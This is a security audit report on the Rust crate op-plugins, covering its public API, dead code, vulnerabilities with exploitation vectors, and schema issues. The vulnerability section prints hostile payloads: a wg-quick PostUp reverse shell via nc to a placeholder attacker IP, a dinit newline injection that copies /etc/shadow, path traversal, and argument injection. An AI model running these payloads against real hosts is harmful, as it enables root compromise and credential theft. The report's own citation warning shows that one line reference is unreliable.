# Security & Quality Audit Report: `op-plugins`

---

## 1. Public API Surface Audit

The public API surface of the `op-plugins` crate provides extensibility for system state management, D-Bus projection, container/VM management, and network orchestration. Below is the comprehensive breakdown of public items.

### Total Public Items Count
Approximately **245** public items (including functions, structs, enums, traits, re-exports, and modules) are exposed.

### Top 10 Most Impactful Public API Items
1. **`Plugin` (Trait)**  
   * **Location:** `crates/op-plugins/src/plugin.rs:102`  
   * **Impact:** The core extensibility interface. All state engine extensions must implement this trait to plug into the host control loop.
2. **`PluginRegistry` (Struct)**  
   * **Location:** `crates/op-plugins/src/registry.rs:27`  
   * **Impact:** Manages live plugin lifecycles, D-Bus path binding, and synchronization with SQLite schemas.
3. **`DefaultPluginRegistry` (Struct)**  
   * **Location:** `crates/op-plugins/src/default_registry.rs:82`  
   * **Impact:** Bootstraps the system by instantiating core state plugins (MCP, bridges, virtual networks) on startup.
4. **`ServiceDef` (Struct)**  
   * **Location:** `crates/op-plugins/src/service_def.rs:217`  
   * **Impact:** Defines the declarative schema for host init services, mapping agnostic definitions to actual dinit/systemd configurations.
5. **`PrivacyRouterPlugin` (Struct)**  
   * **Location:** `crates/op-plugins/src/state_plugins/privacy_router.rs:218`  
   * **Impact:** Orchestrates the system-level security fabric (WireGuard ingress, WARP, egress XRay tunnels, and OpenFlow forwarding policies).
6. **`IncusPlugin` (Struct)**  
   * **Location:** `crates/op-plugins/src/state_plugins/incus.rs:58`  
   * **Impact:** Interacts with `/usr/bin/incus` to manage containerized network elements and workloads.
7. **`OpenFlowPlugin` (Struct)**  
   * **Location:** `crates/op-plugins/src/state_plugins/openflow.rs:197`  
   * **Impact:** Controls packet routing, SDN policies, and security hardening rules on OVS bridges.
8. **`NetStatePlugin` (Struct)**  
   * **Location:** `crates/op-plugins/src/state_plugins/net.rs:97`  
   * **Impact:** Manages network interfaces, physical uplinks, OVS bridges, and persistent `/etc/network/interfaces` configuration.
9. **`WebUiPlugin` (Struct)**  
   * **Location:** `crates/op-plugins/src/state_plugins/web_ui.rs:289`  
   * **Impact:** Exposes the React-based embedded administration console and manages user configurations.
10. **`McpStatePlugin` (Struct)**  
    * **Location:** `crates/op-plugins/src/state_plugins/mcp.rs:123`  
    * **Impact:** Bridges external Model Context Protocol (MCP) servers with the control plane's SQLite state tracking.

---

### Glob Re-exports
* **`crates/op-plugins/src/lib.rs:52`**: `pub use super::state_plugins::*;`  
  * *Risk:* Pollution of the prelude namespace. Any additions to the `state_plugins` directory are automatically re-exported globally, which can lead to namespace collisions and bloated compilation units.

---

### Structs with Over-Exposed Public Fields (Should be Private)

Most configuration and state-tracking structs in this codebase expose all of their internal fields as public. This allows external consumers to modify the fields directly, bypassing validation rules, state invariants, and cryptographic hashing requirements.

| Struct Name | File:Line | Exposed Fields | Risk / Impact |
| :--- | :--- | :--- | :--- |
| `DesiredState` | `crates/op-plugins/src/state.rs:9` | `state`, `timestamp`, `hash`, `description`, `source` | External callers can mutate the `state` field directly without updating the corresponding `hash` verification string, breaking state integrity checks. |
| `ServiceDef` | `crates/op-plugins/src/service_def.rs:217` | All fields (e.g., `name`, `exec_start`, `user`, etc.) | Direct mutation of commands, usernames, or paths bypasses parses-time validation (like verifying that commands are absolute paths). |
| `DnsItem` | `crates/op-plugins/src/state_plugins/dnsresolver.rs:25` | `id`, `mode`, `servers`, `search`, `options` | Malicious actors can bypass input filtering on IP addresses, facilitating configuration injection into `/etc/resolv.conf`. |
| `KeyringState` | `crates/op-plugins/src/state_plugins/keyring.rs:19` | `collections`, `default_collection` | Keyring information can be altered dynamically, causing authentication mismatches. |
| `LxcState` | `crates/op-plugins/src/state_plugins/lxc.rs:18` | `containers` | Direct state manipulation allows container tracking drift. |
| `PrivacyRouterConfig` | `crates/op-plugins/src/state_plugins/privacy_router.rs:33` | All fields (e.g., `wireguard`, `warp`, `xray`) | Allows direct modification of system tunnels, enabling the injection of unvalidated network assets. |

---

## 2. Dead Code Analysis

A significant amount of functionality is present in the codebase but remains uncompiled or unreferenced because its module registrations are commented out in `crates/op-plugins/src/state_plugins/mod.rs`.

### Commented-out / Uncompiled Dead Code Modules
In `crates/op-plugins/src/state_plugins/mod.rs`, the following modules are commented out:
* `// pub mod dnsresolver;` (line 5)
* `// pub mod full_system;` (line 6)
* `// pub mod keyring;` (line 7)
* `// pub mod login1;` (line 8)
* `// pub mod lxc;` (line 9)
* `// pub mod netmaker;` (line 12)
* `// pub mod openflow_obfuscation;` (line 14)
* `// pub mod packagekit;` (line 15)
* `// pub mod pcidecl;` (line 16)
* `// pub mod privacy;` (line 17)
* `// pub mod systemd;` (line 30)
* `// pub mod systemd_networkd;` (line 31)

As a result, the source files for these modules are completely dead and never built as part of the crate.

---

### Unused Imports
* **`crates/op-plugins/src/state_plugins/netmaker.rs:8`**: `use std::collections::HashMap;` is imported but never used in the file.
* **`crates/op-plugins/src/state_plugins/privacy.rs:7`**: `use std::collections::HashMap;` is imported but never used in the file.
* **`crates/op-plugins/src/state_plugins/dinit.rs:10`**: `use std::time::Duration;` is imported but never used in the file.

---

### Dead Code / Suppressed Warning Table

| Item | Type | file:line | Recommendation |
| :--- | :--- | :--- | :--- |
| `keyring` | Module | `crates/op-plugins/src/state_plugins/keyring.rs:3` | This module uses `#![allow(dead_code)]` to suppress compile warnings. If not ready for production, remove the file or compile it under a feature flag rather than silencing dead code globally. |
| `leave_network` | Function | `crates/op-plugins/src/state_plugins/netmaker.rs:142` | Uses `#[allow(dead_code)]`. It is completely unreferenced. Remove the function or implement a test exercising its logic. |
| `apply_unit` | Function | `crates/op-plugins/src/state_plugins/systemd.rs:172` | Uses `#[allow(dead_code)]`. The entire module is uncompiled. Uncomment module definition if needed; otherwise, purge. |
| `snowball_sender` | Struct Field | `crates/op-plugins/src/state_plugins/web_ui.rs:293` | Field is marked `#[allow(dead_code)]`. If snowball audit logging is desired for the Web UI plugin, integrate this sender; otherwise, remove the field. |
| `dnsresolver` | File / Module | `crates/op-plugins/src/state_plugins/dnsresolver.rs:1` | Fully uncompiled module. Purge the file if the `dinit`/`systemd` service manager manages DNS resolution. |
| `full_system` | File / Module | `crates/op-plugins/src/state_plugins/full_system.rs:1` | Fully uncompiled module. Purge the file if full-state backup is managed externally. |
| `login1` | File / Module | `crates/op-plugins/src/state_plugins/login1.rs:1` | Fully uncompiled module. Purge or integrate if session tracking is required. |
| `lxc` | File / Module | `crates/op-plugins/src/state_plugins/lxc.rs:1` | Fully uncompiled module. This file has been replaced by `incus.rs`. This file should be deleted. |
| `openflow_obfuscation` | File / Module | `crates/op-plugins/src/state_plugins/openflow_obfuscation.rs:1` | Fully uncompiled module. All obfuscation flows are already mapped in `openflow.rs` and `privacy_router.rs`. This file is completely redundant. |
| `pcidecl` | File / Module | `crates/op-plugins/src/state_plugins/pcidecl.rs:1` | Fully uncompiled module. Purge the file. |

---

## 3. Security & Quality Vulnerabilities

### [Vulnerability 01] Critical: Host Code Execution as `root` via `wg-quick` Configuration Injection
* **File:** `crates/op-plugins/src/state_plugins/privacy_router.rs:490`
* **Impact:** Remote Code Execution (RCE) / Privilege Escalation.
* **Description:**  
  The plugin validates WireGuard configuration files using `validate_wg_quick_config`. This validation is highly superficial: it only checks for the presence of the strings `[Interface]`, `PrivateKey`, and `Table = off`.
  
  Crucially, `wg-quick` natively supports lifecycle hooks—such as `PostUp`, `PreUp`, `PostDown`, and `PreDown`—under the `[Interface]` section. These keys allow the execution of arbitrary shell commands. Because the plugin does not strip or forbid these keys during validation, a user who can control the path of `wgcf_config` or upload a configuration file can inject malicious host-level commands. When `wg-quick` is invoked as `root` (via `self.run_command`), the injected shell commands are executed immediately as `root` on the host.
* **Exploitation Vector:**  
  A caller modifies the desired state of `privacy_router` via the control plane to point `wgcf_config` to a file with the following contents:
  ```ini
  [Interface]
  PrivateKey = abc...
  Table = off
  PostUp = rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> <port> > /tmp/f
  ```
  The validation function checks for `[Interface]`, `PrivateKey`, and `Table = off`, which are all present. The config is approved. The plugin runs:
  ```rust
  self.run_command("/usr/bin/wg-quick", &["up", config_path])
  ```
  This immediately triggers the reverse shell execution as `root` on the host.

---

### [Vulnerability 02] Critical: Host-level Command Execution via Newline Injection in Dinit Service Files
* **File:** `crates/op-plugins/src/service_def.rs:253` (inside `to_dinit()`)
* **Impact:** Privilege Escalation / Arbitrary Code Execution.
* **Description:**  
  When writing service configurations to Chimera `dinit` files on the host, the `to_dinit` function maps key-value environment tables, run-as users, and working directories into raw strings without filtering out newline characters (`\n`). 
  
  Because `dinit` configurations are line-delimited key-value files, a client with access to set the desired state of the `service` plugin can inject newlines into environment variables or the `user` field. This enables them to inject new configuration keys (like `command`) and execute arbitrary processes with `root` privileges.
* **Exploitation Vector:**  
  The attacker registers or modifies a service where they set an environment variable or the `user` parameter to:
  ```
  root
  command = /bin/sh -c "cat /etc/shadow > /tmp/shadow_leak"
  ```
  The generated `dinit` file output becomes:
  ```ini
  run-as = root
  command = /bin/sh -c "cat /etc/shadow > /tmp/shadow_leak"
  ```
  This injects a new `command` key that overwrites the legitimate service command. When `dinit` starts this service, the injected command is executed as `root`.

---

### [Vulnerability 03] Critical: Host Filesystem Privilege Escalation via BTRFS Golden Image Path Traversal
* **File:** `crates/op-plugins/src/state_plugins/lxc.rs:431` (inside `create_container_from_btrfs_snapshot`)
* **Impact:** Information Disclosure / Privilege Escalation.
* **Description:**  
  The `golden_image` name and `storage` configuration values are pulled directly from raw JSON input (`container.properties`) and are formatted into local filesystem paths without sanitization or path traversal validation. 
  
  Since the plugin invokes `btrfs subvolume snapshot` as `root`, an attacker can use path traversal characters (like `../../../../`) to point the snapshot source to *any* BTRFS subvolume on the host (including the host's root system subvolume or other users' confidential containers). This allows them to clone arbitrary subvolumes into a directory they control, granting them full read access to private host-level files (such as host private keys or database records) inside their container.
* **Exploitation Vector:**  
  The attacker sets the `golden_image` parameter to `../../../../etc` or another BTRFS subvolume path, bypassing expected directories. The plugin runs:
  ```rust
  let snapshot_output = tokio::process::Command::new("btrfs")
      .args([
          "subvolume",
          "snapshot",
          &golden_image_path, // Points to host subvolume root
          &container_rootfs,  // Cloned into the attacker's container
      ])
  ```
  The attacker can now read the contents of the target subvolume directly from the container's root filesystem.

---

### [Vulnerability 04] High: Arbitrary File Content Injection on `/etc/resolv.conf`
* **File:** `crates/op-plugins/src/state_plugins/dnsresolver.rs:83` (inside `write_resolv_conf`)
* **Impact:** DNS Hijacking / Denial of Service.
* **Description:**  
  The `dnsresolver` plugin writes DNS servers, searches, and options directly to a temporary file and overwrites `/etc/resolv.conf`. It performs no validation on the contents of the `servers` field. 
  
  An attacker with control over the desired state can insert arbitrary newline-delimited strings into the `servers` array. This allows them to append malicious configurations directly to `/etc/resolv.conf` (such as setting rogue DNS servers or configuring custom search domains), hijacking host-level name resolution.
* **Exploitation Vector:**  
  An attacker sets the desired DNS configuration to:
  ```json
  {
    "version": 1,
    "items": [
      {
        "id": "resolvconf",
        "mode": "enforce",
        "servers": ["127.0.0.1\nnameserver 8.8.8.8\noptions debug"]
      }
    ]
  }
  ```
  The plugin writes the unvalidated string to `/etc/resolv.conf`, injecting the extra lines into the configuration.

---

### [Vulnerability 05] Medium: Argument Injection in Host-Level Package Managers
* **File:** `crates/op-plugins/src/state_plugins/packagekit.rs:89` (inside `install_via_direct` / `remove_via_direct`)
* **Impact:** System Impairment / Command Hijacking.
* **Description:**  
  The `packagekit` plugin invokes package managers (`apt-get`, `dnf`, or `pacman`) directly, using unsanitized package names provided via raw JSON configuration. 
  
  If a package name begins with a hyphen (e.g. `--config`), it is parsed as a command-line flag rather than a package name by the package manager. This allows attackers to override security policies, inject malicious configuration files, or disable GPG signature verification.
* **Exploitation Vector:**  
  The attacker sets a desired package name to:
  ```
  --config=/tmp/malicious.conf
  ```
  When the plugin runs the installation command:
  ```rust
  Command::new("pacman").args(["-S", "--noconfirm", package_name])
  ```
  This is executed as:
  ```bash
  pacman -S --noconfirm --config=/tmp/malicious.conf
  ```
  This forces `pacman` to load an untrusted configuration file.

---

### [Vulnerability 06] Low: Command Execution Failure via Literal `&&` Shell Operator
* **File:** `crates/op-plugins/src/state_plugins/netmaker.rs:168` (inside `apply_state`)
* **Impact:** Functional Bug / Complete Execution Failure.
* **Description:**  
  The plugin attempts to update package lists and install `netclient` by passing `&&` as a literal argument to `Command::new("apt")`:
  ```rust
  let install_result = Command::new("apt")
      .args(["update", "&&", "apt", "install", "-y", "netclient"])
  ```
  Because `Command::new` does not spawn a shell, the `&&` operator is not interpreted. It is passed as a literal argument to the `apt` binary, which does not recognize it, causing the command to fail. This is a functional bug that completely breaks the auto-installation of the Netmaker agent.

---

## 4. Schema-as-Code Violations

The codebase has several areas that violate the schema-as-code discipline, where data contracts are defined as ad-hoc Rust structs or custom builders instead of formal, versioned schemas (such as Protocol Buffers or OSCAL-compliant files).

1. **Ad-hoc Chat/LLM Exchange Definitions** (`crates/op-plugins/src/chat.rs`)  
   * **Violations:** All data contracts for LLM interactions (`ChatMessage`, `ChatRequest`, `ChatResponse`, `TokenUsage`) are defined as ad-hoc Rust structs with Serde attributes instead of versioned Protocol Buffers.
   * **Impact:** Integrating non-Rust clients or services requires manually duplicating these definitions, raising the risk of deserialization mismatches and breaking API changes.

2. **Custom Programmatic Schema Builder** (`crates/op-plugins/src/state_plugins/plugin_schema_defs.rs`)  
   * **Violations:** Instead of loading versioned Protobuf schemas or OSCAL XML/JSON documents, this module constructs schemas programmatically using a custom `PluginSchema::builder` API.
   * **Impact:** Programmatic schema generation is prone to bugs and cannot be easily validated by external compliance, testing, or auditing engines.

3. **Ad-hoc State Log Modeling** (`crates/op-plugins/src/state.rs`)  
   * **Violations:** Data transitions, validations, and auditing configurations are defined as ad-hoc structs (`StateChange`, `ValidationResult`, `ValidationError`) instead of versioned, OSCAL-compliant schemas.
   * **Impact:** These definitions cannot be ingested by standard GRC (Governance, Risk, and Compliance) tools without custom translation layers.

---
## ⚠ Citation Warnings
- `crates/op-plugins/src/lib.rs:52`: file has 50 lines
